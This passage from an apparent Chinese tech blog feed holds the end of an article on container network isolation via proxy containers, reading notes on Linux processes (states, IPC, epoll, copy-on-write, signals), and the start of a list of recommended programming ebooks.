容器代理实现的隔离方法</strong></p><p>由上可知，networkPolicy的实现方案存在着众多缺点，所以我们还是需要在云原生的场景下探索新的网络隔离方法，接下来我以容器代理的思路为大家介绍云原生场景下比较成熟的隔离方案。</p><p>在介绍容器代理的方式之前，先简单介绍容器之间的网络通信。首先无论pod还是docker之间的通信，它们都会在自己的网络命名空间下与节点上的网络命名空间建立veth对进行连接通信，这些虚拟接口可以分布在多个命名空间上。</p><p>下面以k8s的网络通信举例，在k8s中，将veth对一侧分配给 root network namespace也就是节点的网络命名空间，另一侧分配给 Pod 的网络命名空间。每个 veth 对就像一根网线，连接两侧并允许流量在它们之间流动，如下图：</p><p><img src="https://s.secrss.com/anquanneican/d523e20785d6f48f48ba4be0a5c0c28a.png" alt="img"></p><p>基于上面的基础，我们可以在云集群中的每一个节点上部署一个代理容器，将被代理容器或者pod与宿主机通信的veth piar进行重组，通过代理容器的veth piar连接两侧，效果图如下：</p><p><img src="https://s.secrss.com/anquanneican/dccbf91153122e76f08d95777713e58d.png" alt="img"></p><p>通过上述代理容器的方式，我们可以对节点上面其他容器和pod进行流量控制。基于packet mmap对网络连接进行分析，实现对容器网络通信的网络访问控制，实现网络隔离的效果。</p><p>同时，它也解决了NetworkPolicy很多存在的缺点，具体为以下几点：</p><ul><li><strong>性能影响小</strong>，不需要添加多余的iptables规则，它可以通过TC或者XDP的方式对流量包进行转发，将性能影响降到最小；</li><li><strong>适用性广</strong>，与网络插件解绑，同时支持docker compose、docker Swarm、OpenShift等环境；</li><li><strong>细粒度更高</strong>，支持容器为最小控制单元；</li><li><strong>灵活性高</strong>，满足云原生场景下灵活弹性扩展需求高的特点。</li></ul><p><strong>3.3 理想的容器网络隔离技术需要具备的特点</strong> 通过以上两种云原生网络隔离实现方式的分析，我们可以推断出一个理想的容器网络隔离技术需要满足以下特点：</p><ul><li><strong>性能影响</strong>，实现容器网络防护的同时，需要尽量不去影响集群性能和业务容器的正常运行； 适用性，不应该局限于某一种场景，给用户带来迁移或者架构更新的成本；</li><li><strong>细粒度</strong>，支持容器为新的最小控制单元。另外，目前主流的零信任产品网络防护只做到4层，理想的容器网络隔离技需要做到7层网络防护的效果；</li><li><strong>安全策略能力</strong>，随着云原生可视化技术的成熟，是安全策略的实现基础，基于云原生场景下“东西向”和“南北向”流量的可视化，隔离技术需要实现策略的自动生成更新；</li><li><strong>灵活性</strong>，针对云原生场景下灵活弹性扩展需求高的特点，隔离技术需要做到安全策略和能力快速匹配，实现快速部署以及弹性伸缩。</li></ul><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>本文从传统网络隔离与云原生网络隔离两个角度出发，分析了现有的网络隔离技术的特点，讨论了云原生场景下网络隔离技术需要满足的特点。</p><ul><li>首先我们通过分析传统隔离得出，在面对复杂的云原生应用场景时，为了更好保护我们的业务容器安全，我们需要一些新的隔离技术去实现网络隔离。</li><li>然后，我们通过介绍目前云原生网络隔离的两种实现方案，得出一个理想的容器网络隔离技术需要满足哪些特点。</li><li>最后，希望通过本篇文章的分享，你能有所收获。</li></ul><h3 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h3><p>1.<a href="https://link.zhihu.com/?target=https://ahmet.im/blog/kubernetes-network-policy/">https://ahmet.im/blog/kubernetes-network-policy/</a></p><p>2.<a href="https://link.zhihu.com/?target=https://kubernetes.io/docs/concepts/services-networking/network-policies/">https://kubernetes.io/docs/concepts/services-networking/network-policies/</a></p><p>3.<a href="https://link.zhihu.com/?target=https://www.51cto.com/article/715804.html">https://www.51cto.com/article/715804.html</a> 4.<a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Netfilter">https://en.wikipedia.org/wiki/N</a></p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>Kubernetes</tag>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《理解Linux进程》阅读笔记</title>
    <link href="/2023/03/01/%E3%80%8A%E7%90%86%E8%A7%A3Linux%E8%BF%9B%E7%A8%8B%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/03/01/%E3%80%8A%E7%90%86%E8%A7%A3Linux%E8%BF%9B%E7%A8%8B%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="《理解Linux进程》阅读笔记"><a href="#《理解Linux进程》阅读笔记" class="headerlink" title="《理解Linux进程》阅读笔记"></a>《理解Linux进程》阅读笔记</h1><blockquote><p>本篇文章主要是阅读《理解Linux进程》对相关知识点的简单的介绍与扩展</p></blockquote><h2 id="1-退出码"><a href="#1-退出码" class="headerlink" title="1.退出码"></a>1.退出码</h2><p>任何进程退出时，都会留下退出码，操作系统根据退出码可以知道进程是否正常运行。</p><p>退出码是0到255的整数，通常0表示正常退出，其他数字表示不同的错误。</p><p><strong>不管是正常退出还是异常退出，进程都结束了这个退出码有意义吗？</strong></p><p>有意义，我们在写Bash脚本时，可以根据前一个命令的退出码选择是否执行下一个命令。例如Docker使用Dockerfile来构建镜像，这是类似Bash的领域定义语言(DSL)，每一行执行一个命令，如果命令的进程退出码不为0，构建镜像的流程就会中止，证明Dockerfile有异常，方便用户排查问题。</p><h2 id="2-进程状态转换"><a href="#2-进程状态转换" class="headerlink" title="2.进程状态转换"></a>2.进程状态转换</h2><p><img src="https://s2.loli.net/2023/03/01/FOuhP5nHI1tQU8T.png" alt="进程状态转换图"></p><h3 id="2-1-查看状态"><a href="#2-1-查看状态" class="headerlink" title="2.1 查看状态"></a>2.1 查看状态</h3><p>通过<code>ps aux</code>可以看到进程的状态。</p><p>O：进程正在处理器运行,这个状态从来没有见过.<br>S：休眠状态（sleeping）<br>R：等待运行（runable）R Running or runnable (on run queue) 进程处于运行或就绪状态<br>I：空闲状态（idle）<br>Z：僵尸状态（zombie）<br>T：跟踪状态（Traced）<br>B：进程正在等待更多的内存页<br>D: 不可中断的深度睡眠，一般由IO引起，同步IO在做读或写操作时，cpu不能做其它事情，只能等待，这时进程处于这种状态，如果程序采用异步IO，这种状态应该就很少见到了</p><p>其中就绪状态表示进程已经分配到除CPU以外的资源，等CPU调度它时就可以马上执行了。运行状态就是正在运行了，获得包括CPU在内的所有资源。等待状态表示因等待某个事件而没有被执行，这时候不耗CPU时间，而这个时间有可能是等待IO、申请不到足够的缓冲区或者在等待信号。</p><h2 id="3-活锁"><a href="#3-活锁" class="headerlink" title="3.活锁"></a>3.活锁</h2><h3 id="3-1-活锁实例"><a href="#3-1-活锁实例" class="headerlink" title="3.1 活锁实例"></a>3.1 活锁实例</h3><p>举个很简单的例子，两个人相向过独木桥，他们同时向一边谦让，这样两个人都过不去，然后二者同时又移到另一边，这样两个人又过不去了。如果不受其他因素干扰，两个人一直同步在移动，但外界看来两个人都没有前进，这就是活锁。</p><p>活锁会导致CPU耗尽的，解决办法是引入随机变量、增加重试次数等。</p><p>所以活锁也是程序设计上可能存在的问题，导致进程都没办法运行下去了，还耗CPU。</p><h2 id="4-POSIX简介"><a href="#4-POSIX简介" class="headerlink" title="4.POSIX简介"></a>4.POSIX简介</h2><p>POSIX(Portable Operation System Interface)就是一种操作系统的接口标准</p><h3 id="4-1-POSIX进程"><a href="#4-1-POSIX进程" class="headerlink" title="4.1 POSIX进程"></a>4.1 POSIX进程</h3><p>我们运行Hello World程序时，操作系统通过POSIX定义的<code>fork</code>和<code>exec</code>接口创建起一个POSIX进程，这个进程就可以使用通用的IPC、信号等机制。</p><h3 id="4-2-POSIX线程"><a href="#4-2-POSIX线程" class="headerlink" title="4.2 POSIX线程"></a>4.2 POSIX线程</h3><p>POSIX也定义了线程的标准，包括创建和控制线程的API，在Pthreads库中实。</p><h2 id="5-Nohup命令"><a href="#5-Nohup命令" class="headerlink" title="5.Nohup命令"></a>5.Nohup命令</h2><p>每个开发者都会躺过这个坑，在命令行跑一个后台程序，关闭终端后发现进程也退出了，网上搜一下发现要用<code>nohup</code>，究竟什么原因呢？</p><p>普通进程运行时默认会绑定TTY(虚拟终端)，关闭终端后系统会给上面所有进程发送TERM信号，这时普通进程也就退出了。当然还有些进程不会退出，这就是后面将会提到的守护进程。</p><p><code>Nohup</code>的原理也很简单，终端关闭后会给此终端下的每一个进程发送SIGHUP信号，而使用<code>nohup</code>运行的进程则会忽略这个信号，因此终端关闭后进程也不会退出。</p><h2 id="6-进程锁"><a href="#6-进程锁" class="headerlink" title="6.进程锁"></a>6.进程锁</h2><p>这里的进程锁与线程锁、互斥量、读写锁和自旋锁不同，它是通过记录一个PID文件，避免两个进程同时运行的文件锁。</p><p>进程锁的作用之一就是可以协调进程的运行，例如<a href="http://www.live-in.org/archives/1036.html">crontab使用进程锁解决冲突</a>提到，使用crontab限定每一分钟执行一个任务，但这个进程运行时间可能超过一分钟，如果不用进程锁解决冲突的话两个进程一起执行就会有问题。后面提到的项目实例Run也有类似的问题，通过进程锁可以解决进程间同步的问题。</p><p>使用PID文件锁还有一个好处，方便进程向自己发停止或者重启信号。Nginx编译时可指定参数<code>--pid-path=/var/run/nginx.pid</code>，进程起来后就会把当前的PID写入这个文件，当然如果这个文件已经存在了，也就是前一个进程还没有退出，那么Nginx就不会重新启动。进程管理工具Supervisord也是通过记录进程的PID来停止或者拉起它监控的进程的。</p><h2 id="7-孤儿进程与僵尸进程"><a href="#7-孤儿进程与僵尸进程" class="headerlink" title="7.孤儿进程与僵尸进程"></a>7.孤儿进程与僵尸进程</h2><h3 id="7-1-孤儿进程"><a href="#7-1-孤儿进程" class="headerlink" title="7.1 孤儿进程"></a>7.1 孤儿进程</h3><p>孤儿进程指的是在其父进程执行完成或被终止后仍继续运行的一类进程。</p><p>孤儿进程与僵尸进程是完全不同的，孤儿进程借用了现实中孤儿的概念，也就是父进程不在了，子进程还在运行，这时我们就把子进程的PPID设为1。前面讲PID提到，操作系统会创建进程号为1的init进程，它没有父进程也不会退出，可以收养系统的孤儿进程。</p><h3 id="7-2-孤儿进程用途"><a href="#7-2-孤儿进程用途" class="headerlink" title="7.2 孤儿进程用途"></a>7.2 孤儿进程用途</h3><p>在现实中用户可能刻意使进程成为孤儿进程，这样就可以让它与父进程会话脱钩，例如守护进程。</p><h3 id="7-3-僵尸进程"><a href="#7-3-僵尸进程" class="headerlink" title="7.3 僵尸进程"></a>7.3 僵尸进程</h3><p>当一个进程完成它的工作终止之后，它的父进程需要调用wait()或者waitpid()系统调用取得子进程的终止状态。</p><p>一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵死进程。</p><h2 id="8-进程间通信"><a href="#8-进程间通信" class="headerlink" title="8.进程间通信"></a>8.进程间通信</h2><p>IPC全称Interprocess Communication，指进程间协作的各种方法，当然包括共享内存，信号量或Socket等。</p><h3 id="8-1-管道-Pipe"><a href="#8-1-管道-Pipe" class="headerlink" title="8.1 管道(Pipe)"></a>8.1 管道(Pipe)</h3><p>管道是进程间通信最简单的方式，任何进程的标准输出都可以作为其他进程的输入。</p><h3 id="8-2-信号-Signal"><a href="#8-2-信号-Signal" class="headerlink" title="8.2 信号(Signal)"></a>8.2 信号(Signal)</h3><p>我们知道信号是进程间通信的其中一种方法，当然也可以是内核给进程发送的消息，注意信息只是告诉进程发生了什么事件，而不会传递任何数据。</p><p>简单介绍几个我们最常用的，在命令行中止一个程序我们一般摁Ctrl+c，这就是发送SIGINT信号，而使用kill命令呢？默认是SIGTERM，加上<code>-9</code>参数才是SIGKILL。</p><h3 id="8-3-消息队列-Message"><a href="#8-3-消息队列-Message" class="headerlink" title="8.3 消息队列(Message)"></a>8.3 消息队列(Message)</h3><p>和传统消息队列类似，但是在内核实现的。</p><h3 id="8-4-共享内存-Shared-Memory"><a href="#8-4-共享内存-Shared-Memory" class="headerlink" title="8.4 共享内存(Shared Memory)"></a>8.4 共享内存(Shared Memory)</h3><p>不同进程之间内存空间是独立的，也就是说进程不能访问也不会干扰其他进程的内存。如果两个进程希望通过共享内存的方式通信呢？可以通过<code>mmap()</code>系统调用实现。</p><h3 id="8-5-信号量-Semaphore"><a href="#8-5-信号量-Semaphore" class="headerlink" title="8.5 信号量(Semaphore)"></a>8.5 信号量(Semaphore)</h3><p>信号量本质上是一个整型计数器，<strong>调用<code>wait</code>时计数减一，减到零开始阻塞进程，从而达到进程、线程间协作的作用。</strong></p><h3 id="8-6-套接口-Socket"><a href="#8-6-套接口-Socket" class="headerlink" title="8.6 套接口(Socket)"></a>8.6 套接口(Socket)</h3><p>也就是通过网络来通信，这也是<strong>最通用的IPC</strong>，不要求进程在同一台服务器上。</p><h2 id="9-文件描述符"><a href="#9-文件描述符" class="headerlink" title="9.文件描述符"></a>9.文件描述符</h2><p>Linux很重要的设计思想就是一切皆文件，网络是文件，键盘等外设也是文件？于是所有资源都有了统一的接口，开发者可以像写文件那样通过网络传输数据，我们也可以通过<code>/proc/</code>的文件看到进程的资源使用情况。</p><p>内核给每个访问的文件分配了**文件描述符(File Descriptor)**，它本质是一个非负整数，在打开或新建文件时返回，以后读写文件都要通过这个文件描述符了。</p><h3 id="9-1-应用"><a href="#9-1-应用" class="headerlink" title="9.1 应用"></a>9.1 应用</h3><p>操作系统打开的文件这么多，不可能他们共用一套文件描述符整数吧？其实Linux实现时这个fd是一个索引值，指向每个进程打开文件的记录表。</p><p>POSIX已经定义了<strong>STDIN_FILENO、STDOUT_FILENO和STDERR_FILENO三个常量，也就是0、1、2</strong>。这三个文件描述符是每个进程都有的，这也解释了为什么每个进程都有编号为0、1、2的文件而不会与其他进程冲突。</p><p>文件描述符帮助应用找到这个文件，而文件的打开模式等上下文信息存储在文件对象中，这个对象直接与文件描述符关联。</p><h2 id="10-Epoll"><a href="#10-Epoll" class="headerlink" title="10.Epoll"></a>10.Epoll</h2><h3 id="10-1-简介"><a href="#10-1-简介" class="headerlink" title="10.1 简介"></a>10.1 简介</h3><p>Epoll是poll的改进版，更加高效，能同时处理大量文件描述符，跟高并发有关，Nginx就是充分利用了epoll的特性。讲这些没用，我们先了解poll是什么。</p><h3 id="10-2-Poll"><a href="#10-2-Poll" class="headerlink" title="10.2 Poll"></a>10.2 Poll</h3><p>Poll本质上是Linux系统调用，其接口为<code>int poll(struct pollfd *fds,nfds_t nfds, int timeout)</code>，作用是监控资源是否可用。</p><p>举个例子，一个Web服务器建了多个socket连接，它需要知道里面哪些连接传输发了请求需要处理，功能与<code>select</code>系统调用类似，不过<code>poll</code>不会清空文件描述符集合，因此检测大量socket时更加高效。</p><h3 id="10-3-Epoll"><a href="#10-3-Epoll" class="headerlink" title="10.3 Epoll"></a>10.3 Epoll</h3><p>我们重点看看epoll，它大幅提升了高并发服务器的资源使用率，相比poll而言哦。前面提到poll会轮询整个文件描述符集合，而epoll可以做到只查询被内核IO事件唤醒的集合，当然它还提供边沿触发(Edge Triggered)等特性。</p><p>不知大家是否了解C10K问题，指的是服务器如何支持同时一万个连接的问题。如果是一万个连接就有至少一万个文件描述符，poll的效率也随文件描述符的更加而下降，epoll不存在这个问题是因为它仅关注活跃的socket。</p><h3 id="10-4-实现"><a href="#10-4-实现" class="headerlink" title="10.4 实现"></a>10.4 实现</h3><p>这是怎么做到的呢？简单来说epoll是基于文件描述符的callback函数来实现的，只有发生IO时间的socket会调用callback函数，然后加入epoll的Ready队列。更多实现细节可以参考Linux源码，</p><h3 id="10-5-Mmap"><a href="#10-5-Mmap" class="headerlink" title="10.5 Mmap"></a>10.5 Mmap</h3><p>无论是select、poll还是epoll，他们都要把文件描述符的消息送到用户空间，这就存在内核空间和用户空间的内存拷贝。其中epoll使用mmap来共享内存，提高效率。</p><p>Mmap不是进程的概念，这里提一下是因为epoll使用了它，这是一种共享内存的方法，而Go语言的设计宗旨是”<strong>不要通过共享来通信，通过通信来共享</strong>“，所以我们也可以思考下进程的设计，是使用mmap还是Go提供的channel机制呢。</p><h2 id="11-写时复制-Copy-On-Write"><a href="#11-写时复制-Copy-On-Write" class="headerlink" title="11.写时复制(Copy On Write)"></a>11.写时复制(Copy On Write)</h2><p>一般我们运行程序都是Fork一个进程后马上执行Exec加载程序，而Fork的是否实际上用的是父进程的堆栈空间，Linux通过Copy On Write技术极大地减少了Fork的开销。</p><p><strong>Copy On Write的含义是只有真正写的时候才把数据写到子进程的数据，Fork时只会把页表复制到子进程，这样父子进程都指向同一个物理内存页，只有再写子进程的时候才会把内存页的内容重新复制一份。</strong></p><h2 id="12-Cgroups与Namespaces"><a href="#12-Cgroups与Namespaces" class="headerlink" title="12.Cgroups与Namespaces"></a>12.Cgroups与Namespaces</h2><h3 id="12-1-Cgroups"><a href="#12-1-Cgroups" class="headerlink" title="12.1　Cgroups"></a>12.1　Cgroups</h3><p><strong>Cgroups</strong>全称Control Groups，是Linux内核用于资源隔离的技术。目前Cgroups可以控制CPU、内存、磁盘访问。</p><h3 id="12-２-Namespaces"><a href="#12-２-Namespaces" class="headerlink" title="12.２　Namespaces"></a>12.２　Namespaces</h3><p>Linux Namespaces是资源隔离技术，在2.6.23合并到内核，而在3.12内核加入对用户空间的支持。</p><p>Namespaces是容器技术的基础，因为有了命名空间的隔离，才能限制容器之间的进程通信，像虚拟内存对于物理内存那样，开发者无需针对容器修改已有的代码。</p><h2 id="13-捕获SIGKILL"><a href="#13-捕获SIGKILL" class="headerlink" title="13.捕获SIGKILL"></a>13.捕获SIGKILL</h2><p>SIGKILL是常见的Linux信号，我们使用<code>kill</code>命令杀掉进程也就是像进程发送SIGKILL信号。</p><p>和其他信号不同，**<a href="https://en.wikipedia.org/wiki/Unix_signal#SIGKILL">SIGKILL</a>和SIGSTOP是不可被Catch的，**因此下面的代码是能编译通过但也是无效的，更多细节可以参考<a href="https://github.com/golang/go/issues/9463">golang&#x2F;go#9463</a>.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">c := <span class="hljs-built_in">make</span>(chan os<span class="hljs-selector-class">.Signal</span>, <span class="hljs-number">1</span>)<br>signal<span class="hljs-selector-class">.Notify</span>(c, syscall<span class="hljs-selector-class">.SIGKILL</span>, syscall.SIGSTOP)<br></code></pre></td></tr></table></figure><h2 id="14-系统调用sendfile"><a href="#14-系统调用sendfile" class="headerlink" title="14.系统调用sendfile"></a>14.系统调用sendfile</h2><p><a href="http://man7.org/linux/man-pages/man2/sendfile.2.html">Sendfile</a>是Linux实现的系统调用，可以通过避免文件在内核态和用户态的拷贝来优化文件传输的效率。</p><p>其中大名鼎鼎的分布式消息队列服务Kafka就使用sendfile来优化效率，具体用法可参见其<a href="http://kafka.apache.org/documentation.html">官方文档</a>。</p><h2 id="参考书籍"><a href="#参考书籍" class="headerlink" title="参考书籍"></a>参考书籍</h2><ul><li><a href="https://github.com/tobegit3hub/understand_linux_process">理解Linux进程</a></li><li><a href="http://book.douban.com/subject/24298701/">理解Unix进程</a></li><li><a href="http://book.douban.com/subject/1467587/">Unix编程艺术</a></li><li><a href="http://book.douban.com/subject/1788421/">Unix环境高级编程</a></li><li><a href="http://book.douban.com/subject/24316255/">Go Web编程</a></li><li><a href="http://book.douban.com/subject/26244729/">Go并发编程实战</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>操作系统</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电子书推荐</title>
    <link href="/2023/02/28/%E7%94%B5%E5%AD%90%E4%B9%A6%E6%8E%A8%E8%8D%90/"/>
    <url>/2023/02/28/%E7%94%B5%E5%AD%90%E4%B9%A6%E6%8E%A8%E8%8D%90/</url>
    
    <content type="html"><![CDATA[<h1 id="电子书推荐"><a href="#电子书推荐" class="headerlink" title="电子书推荐"></a>电子书推荐</h1><h2 id="语言无关"><a href="#语言无关" class="headerlink" title="语言无关"></a>语言无关</h2><h3 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h3><ul><li><a href="https://web.archive.org/web/20191004044726/http://igit.linuxtoy.org:80/index.html">沉浸式学 Git</a> - Jim Weirich, <code>trl.:</code> 徐小东 a.k.a toy <em>(:card_file_box: archived)</em></li><li><a href="http://backlogtool.com/git-guide/cn/">猴子都能懂的GIT入门</a> - Nulab Inc.</li><li><a href="https://rogerdudler.github.io/git-guide/index.zh.html">Git - 简易指南</a> - Roger Dudler, <code>trl.:</code> 罗杰·杜德勒 (HTML)</li><li><a href="http://gitref.justjavac.com/">Git 参考手册</a> - CHEN Yangjian</li><li><a href="https://github.com/flyhigher139/Git-Cheat-Sheet">Git-Cheat-Sheet</a> - flyhigher139</li><li><a href="http://danielkummer.github.io/git-flow-cheatsheet/index.zh_CN.html">git-flow 备忘清单</a> - Daniel Kummer, et al.</li><li><a href="http://www-cs-students.stanford.edu/~blynn/gitmagic/intl/zh_cn/">Git Magic</a> - Ben Lynn, <code>trl.:</code> 俊杰, 萌和江薇, et al. (HTML)</li><li><a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000">Git教程</a> - 廖雪峰</li><li><a href="https://github.com/waylau/github-help">Github帮助文档</a> - Way Lau</li><li><a href="https://snowdream86.gitbooks.io/github-cheat-sheet/content/zh/">GitHub秘籍</a> - snowdream86</li><li><a href="https://github.com/gotgit/gotgithub">Got GitHub</a> - Jiang Xin, The GotGit community</li><li><a href="http://www.worldhello.net/gotgithub/index.html">GotGitHub</a> - Jiang Xin, The GotGit community</li><li><a href="https://zh-hginit.readthedocs.io/en/latest/">HgInit (中文版)</a> - The HgInit team, <code>trl.:</code> Brant Young</li><li><a href="https://www.mercurial-scm.org/wiki/ChineseTutorial">Mercurial 使用教程</a> - The Mercurial team</li><li><a href="https://git-scm.com/book/zh/">Pro Git</a> - Scott Chacon, Ben Straub, <code>trl.:</code> Alan Wang, <code>trl.:</code> 啊咪咪小熊, et al. (HTML, PDF, EPUB)</li><li><a href="https://bingohuang.gitbooks.io/progit2/content">Pro Git 第二版 中文版</a> - Bingo Huang</li><li><a href="http://svnbook.red-bean.com/nightly/zh/index.html">Subversion 版本控制</a> - Ben Collins-Sussman, Brian W. Fitzpatrick, C. Michael Pilato</li></ul><h3 id="编程艺术"><a href="#编程艺术" class="headerlink" title="编程艺术"></a>编程艺术</h3><ul><li><a href="http://www.kancloud.cn/kancloud/intro-to-prog/52592">编程入门指南</a></li><li><a href="https://github.com/julycoding/The-Art-Of-Programming-by-July">程序员编程艺术</a></li><li><a href="http://www.oschina.net/translate/what-every-programmer-should-know-about-memory-part1">每个程序员都应该了解的内存知识 (第一部分)</a></li></ul><h3 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h3><ul><li><a href="https://github.com/DeathKing/Learning-SICP">《计算机程序的结构和解释》公开课 翻译项目</a></li></ul><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><ul><li><a href="http://i.linuxtoy.org/docs/guide/index.html">开源世界旅行手册</a></li><li><a href="https://github.com/tobegit3hub/understand_linux_process">理解Linux进程</a></li><li><a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md">命令行的艺术</a></li><li><a href="http://cn.linux.vbird.org/linux_server/">鸟哥的 Linux 私房菜 服务器架设篇</a></li><li><a href="http://cn.linux.vbird.org/linux_basic/linux_basic.php">鸟哥的 Linux 私房菜 基础学习篇</a></li><li><a href="https://tinylab.gitbooks.io/elinux/content/zh/">嵌入式 Linux 知识库 (eLinux.org 中文版)</a></li><li><a href="https://github.com/yeasy/docker_practice">Docker — 从入门到实践</a></li><li><a href="http://yuedu.baidu.com/ebook/d817967416fc700abb68fca1">Docker入门实战</a></li><li><a href="https://github.com/widuu/chinese_docker">Docker中文指南</a></li><li><a href="http://www.freebsd.org/doc/zh_CN.UTF-8/books/handbook/">FreeBSD 使用手册</a></li><li><a href="http://works.jinbuguo.com/lfs/lfs62/index.html">Linux 构建指南</a></li><li><a href="http://sourceforge.net/projects/elpi/">Linux 系统高级编程</a></li><li><a href="https://tinylab.gitbooks.io/linux-doc/content/zh-cn/">Linux Documentation (中文版)</a></li><li><a href="http://happypeter.github.io/LGCB/book/">Linux Guide for Complete Beginners</a></li><li><a href="https://github.com/me115/linuxtools_rst">Linux工具快速教程</a></li><li><a href="https://aaaaaashu.gitbooks.io/mac-dev-setup/content/">Mac 开发配置手册</a></li><li><a href="http://pages.cs.wisc.edu/~remzi/OSTEP/">Operating Systems: Three Easy Pieces</a></li><li><a href="http://billie66.github.io/TLCL/index.html">The Linux Command Line</a></li><li><a href="http://wiki.ubuntu.org.cn/UbuntuManual">Ubuntu 参考手册</a></li><li><a href="https://www.gitbook.com/book/objectkuan/ucore-docs/details">uCore Lab: Operating System Course in Tsinghua University</a></li><li><a href="https://web.archive.org/web/20210812021003/cb.vu/unixtoolbox_zh_CN.xhtml">UNIX TOOLBOX</a> <em>(:card_file_box: archived)</em></li></ul><h3 id="程序员杂谈"><a href="#程序员杂谈" class="headerlink" title="程序员杂谈"></a>程序员杂谈</h3><ul><li><a href="http://www.kancloud.cn/kancloud/a-programmer-prepares">程序员的自我修养</a></li></ul><h3 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h3><ul><li><a href="http://dataminingguide.books.yourtion.com/">面向程序员的数据挖掘指南</a></li><li><a href="https://github.com/linyiqun/DataMiningAlgorithm">数据挖掘中经典的算法实现和详细的注释</a></li><li><a href="https://aiyanbo.gitbooks.io/spark-programming-guide-zh-cn/content/">Spark 编程指南简体中文版</a></li></ul><h3 id="分布式系统"><a href="#分布式系统" class="headerlink" title="分布式系统"></a>分布式系统</h3><ul><li><a href="http://dcaoyuan.github.io/papers/pdfs/Scalability.pdf">走向分布式</a> (PDF)</li></ul><h3 id="管理和监控"><a href="#管理和监控" class="headerlink" title="管理和监控"></a>管理和监控</h3><ul><li><a href="https://www.gitbook.com/book/fuxiaopang/learnelasticsearch/details">ElasticSearch 权威指南</a></li><li><a href="https://web.archive.org/web/20200415002735/https://es.xiaoleilu.com/">Elasticsearch 权威指南（中文版）</a> <em>(:card_file_box: archived)</em></li><li><a href="http://kibana.logstash.es/">ELKstack 中文指南</a></li><li><a href="https://github.com/chenryn/logstash-best-practice-cn">Logstash 最佳实践</a></li><li><a href="http://udn.yyuap.com/doc/mastering-elasticsearch/">Mastering Elasticsearch(中文版)</a></li><li><a href="https://www.gitbook.com/book/wizardforcel/puppet-27-cookbook/details">Puppet 2.7 Cookbook 中文版</a></li></ul><h3 id="函数式概念"><a href="#函数式概念" class="headerlink" title="函数式概念"></a>函数式概念</h3><ul><li><a href="https://github.com/justinyhuang/Functional-Programming-For-The-Rest-of-Us-Cn">傻瓜函数编程</a></li></ul><h3 id="计算机图形学"><a href="#计算机图形学" class="headerlink" title="计算机图形学"></a>计算机图形学</h3><ul><li><a href="https://learnopengl-cn.github.io/">LearnOpenGL CN</a></li><li><a href="https://github.com/zilongshanren/opengl-tutorials">OpenGL 教程</a></li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li><a href="http://ifeve.com/perfbook/">深入理解并行编程</a></li><li><a href="https://community.emc.com/docs/DOC-16067">SAN 管理入门系列</a></li><li><a href="http://sketchcn.com/sketch-chinese-user-manual.html#introduce">Sketch 中文手册</a></li></ul><h3 id="软件开发方法"><a href="#软件开发方法" class="headerlink" title="软件开发方法"></a>软件开发方法</h3><ul><li><a href="https://github.com/justinyhuang/Functional-Programming-For-The-Rest-of-Us-Cn">傻瓜函数编程</a> (《Functional Programming For The Rest of Us》中文版)</li><li><a href="http://www.infoq.com/cn/minibooks/scrum-xp-from-the-trenches">硝烟中的 Scrum 和 XP</a></li></ul><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><ul><li><a href="https://refactoringguru.cn/design-patterns">深入设计模式</a></li><li><a href="http://blog.csdn.net/lovelion/article/details/17517213">史上最全设计模式导学目录</a></li><li><a href="https://github.com/me115/design_patterns">图说设计模式</a></li></ul><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><!-- Waiting to add in --><h3 id="项目相关"><a href="#项目相关" class="headerlink" title="项目相关"></a>项目相关</h3><ul><li><a href="https://github.com/ecomfe/spec">编码规范</a></li><li><a href="http://www.ituring.com.cn/book/1143">开源软件架构</a></li><li><a href="https://wizardforcel.gitbooks.io/ibm-j-ap">让开发自动化系列专栏</a></li><li><a href="https://wizardforcel.gitbooks.io/ibm-j-cq">追求代码质量</a></li><li><a href="http://docs.huihoo.com/gnu/linux/gmake.html">GNU make 指南</a></li><li><a href="https://github.com/waylau/Gradle-2-User-Guide">Gradle 2 用户指南</a></li><li><a href="http://yuedu.baidu.com/ebook/f23af265998fcc22bcd10da2">Gradle 中文使用文档</a></li><li><a href="https://web.archive.org/web/20170616013024/http://local.joelonsoftware.com/wiki/Chinese_(Simplified)">Joel谈软件</a></li><li><a href="https://einverne.gitbook.io/selenium-doc/">selenium 中文文档</a></li></ul><h3 id="在线教育"><a href="#在线教育" class="headerlink" title="在线教育"></a>在线教育</h3><ul><li><a href="http://edu.51cto.com/">51CTO学院</a></li><li><a href="http://yun.itheima.com/">黑马程序员</a></li><li><a href="http://www.hubwiz.com/">汇智网</a></li><li><a href="http://www.jikexueyuan.com/">极客学院</a></li><li><a href="http://www.jisuanke.com/">计蒜客</a></li><li><a href="http://www.imooc.com/course/list">慕课网</a></li><li><a 